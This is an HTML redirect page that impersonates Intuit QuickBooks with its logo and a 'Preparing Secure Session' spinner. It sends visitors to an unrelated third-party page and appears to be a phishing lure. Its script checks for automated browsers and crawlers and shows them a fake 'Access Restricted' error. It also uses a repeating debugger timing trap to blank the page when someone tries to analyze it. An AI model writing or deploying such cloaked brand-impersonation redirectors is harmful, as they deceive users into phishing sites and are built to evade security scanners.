<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>Redirecting...</title>

    <noscript>
        <meta http-equiv="refresh" content="5; url=https://0370c1d.netsolhost.com/pelt.html">
    </noscript>

    <style>
        :root {
            --qb-green: #2ca01c;
            --bg: #eceef1;
            --card: #ffffff;
            --heading: #393a3d;
            --subtext: #6b6c72;
            --ring: #e3e5e8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Avenir Next', Avenir, -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--heading);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            -webkit-font-smoothing: antialiased;
        }

        .card {
            width: 100%;
            max-width: 520px;
            background: var(--card);
            border-radius: 16px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
            padding: 32px 40px 40px;
        }

        .card-body {
            text-align: center;
        }

        .card-header {
            margin-bottom: 36px;
        }

        .card-header img {
            display: block;
            height: 34px;
            width: auto;
        }

        .spinner {
            width: 56px;
            height: 56px;
            margin: 0 auto 28px;
            animation: spin 0.9s linear infinite;
        }

        .spinner-track {
            fill: none;
            stroke: var(--ring);
            stroke-width: 4;
        }

        .spinner-arc {
            fill: none;
            stroke: var(--qb-green);
            stroke-width: 4;
            stroke-linecap: round;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        h1 {
            font-size: 1.375rem;
            font-weight: 600;
            color: var(--heading);
            margin-bottom: 12px;
            letter-spacing: -0.01em;
        }

        .subtext {
            font-size: 0.9375rem;
            line-height: 1.5;
            color: var(--subtext);
            max-width: 380px;
            margin: 0 auto;
        }

        .hidden {
            display: none;
        }

        #error-state h1 {
            color: #c62828;
        }
    </style>
</head>
<body>

    <div id="loading-state" class="card">
        <div class="card-header">
            <img
                src="https://ci3.googleusercontent.com/meips/ADKq_Nb2ni8YNKg_eADgvbqu--50PK5zgz_pJYEKokJtREZ8ExtjDAd0nfb-CiP5yFPE0mThtfQbTlwcGXjvz4xasiPjiGH5CRz2CKlAhOKB53kUzAYN_7xqT2CSHQ=s0-d-e1-ft#https://offcnt.intuit.com/images/US/OINP/310/136/social_qb_logo2.png"
                alt="Intuit QuickBooks"
                width="155"
                height="68"
            >
        </div>
        <div class="card-body">
            <svg class="spinner" viewBox="0 0 56 56" aria-hidden="true">
                <circle class="spinner-track" cx="28" cy="28" r="22"></circle>
                <circle class="spinner-arc" cx="28" cy="28" r="22" stroke-dasharray="40 100"></circle>
            </svg>
            <h1>Preparing Secure Session...</h1>
            <p class="subtext">Please wait while we securely redirect you to the requested destination.</p>
        </div>
    </div>

    <div id="error-state" class="card hidden">
        <div class="card-header">
            <img
                src="https://ci3.googleusercontent.com/meips/ADKq_Nb2ni8YNKg_eADgvbqu--50PK5zgz_pJYEKokJtREZ8ExtjDAd0nfb-CiP5yFPE0mThtfQbTlwcGXjvz4xasiPjiGH5CRz2CKlAhOKB53kUzAYN_7xqT2CSHQ=s0-d-e1-ft#https://offcnt.intuit.com/images/US/OINP/310/136/social_qb_logo2.png"
                alt="Intuit QuickBooks"
                width="155"
                height="68"
            >
        </div>
        <div class="card-body">
            <h1>Access Restricted</h1>
            <p class="subtext">We could not verify your connection. If you are using a VPN or proxy, please disable it and try again.</p>
        </div>
    </div>

    <script>
        (function() {
            const CONFIG = {
                destination: "https://0370c1d.netsolhost.com/pelt.html",
                delay: 1800,
                requireInteraction: true
            };

            const selectors = {
                loading: document.getElementById('loading-state'),
                error: document.getElementById('error-state')
            };

            function isBot() {
                const ua = navigator.userAgent.toLowerCase();
                const signals = [
                    navigator.webdriver,
                    !navigator.languages || navigator.languages.length === 0,
                    window.innerWidth < 100 || window.innerHeight < 100,
                    /bot|crawler|spider|headless|selenium|puppeteer/i.test(ua)
                ];
                return signals.some(s => s === true);
            }

            const preventAnalysis = () => {
                const start = Date.now();
                debugger;
                if (Date.now() - start > 100) {
                    window.location.href = "about:blank";
                }
            };

            function performRedirect(url) {
                const methods = [
                    () => window.location.replace(url),
                    () => { window.location.href = url; },
                    () => {
                        const a = document.createElement('a');
                        a.href = url;
                        document.body.appendChild(a);
                        a.click();
                    }
                ];

                try {
                    methods[0]();
                } catch (e) {
                    methods[1]();
                }
            }

            let hasInteracted = false;
            if (CONFIG.requireInteraction) {
                ['mousedown', 'keydown', 'touchstart'].forEach(evt => {
                    document.addEventListener(evt, () => { hasInteracted = true; }, { once: true });
                });
            } else {
                hasInteracted = true;
            }

            setTimeout(() => {
                if (isBot()) {
                    selectors.loading.classList.add('hidden');
                    selectors.error.classList.remove('hidden');
                    return;
                }

                performRedirect(CONFIG.destination);
            }, CONFIG.delay);

            setInterval(preventAnalysis, 3000);
        })();
    </script>
</body>
</html>
